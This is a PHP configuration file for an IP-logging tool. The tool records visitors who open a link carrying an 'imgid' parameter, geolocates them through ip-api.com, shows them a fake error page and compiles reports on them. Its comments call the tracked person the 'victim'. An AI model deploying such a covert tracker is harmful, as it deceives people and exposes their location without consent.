<?php
/**
 * IPLog config file – all settings should be changed here!
 */

// The database file
define('DB_FILE', 'IPs.sqlite');

// Should the force show feature be enabled?
// When passing the force show parameter,
// E.g. http://example.org/?QUERY_PARAM=QUERY&forceShow=true
// The IP data will be viewable even by the victim themselves upon refresh.
define('ENABLE_FORCESHOW', false);

// When this is set to true,
// Setting the allClients parameter to true
// Generates a report of all logged IPs.
define('ENABLE_ALL_CLIENTS_REPORT', true);

// What secret should be used for a full report?
// When not empty, access to a full report of all entries will only be granted
// if the secret parameter is set to the value below.
// E.g. http://example.org/?allClients=true&secret=mySecret
define('REPORT_ACCESS_SECRET', 'mySecret');

// The log mode.
// When set to single, only logs 1 client per query.
// When set to multi, logs all requests for a query.
define('LOG_MODE', 'single');

// Which parameter should 'listen' to te query string?
// E.g. http://example.org/?QUERY_PARAM=QUERY
define('QUERY_PARAM', 'imgid');

// Should the IP be sent to the IP-API for processing?
// It will be sent to the API as such: http://ip-api.com/json/127.0.0.1
// If false, geolocation details will be left empty.
define('PROCESS_IP', true);

// Which timezone should be used for logging?
// E.g. 'Europe/Berlin'
define('TIMEZONE', 'Europe/Berlin');

// What HTML template should be used for formatting the report?
// E.g. 'report.tpl'
define('REPORT_PAGE_TPL', 'report_page.tpl');

// What HTML template should be used for formatting the report entry?
// E.g. 'report_entry.tpl'
define('REPORT_ENTRY_TPL', 'report_entry.tpl');

// What HTML template should be used for formatting the error page?
// E.g. 'report.tpl'
define('FAKE_ERROR_TPL', 'fake_error.tpl');
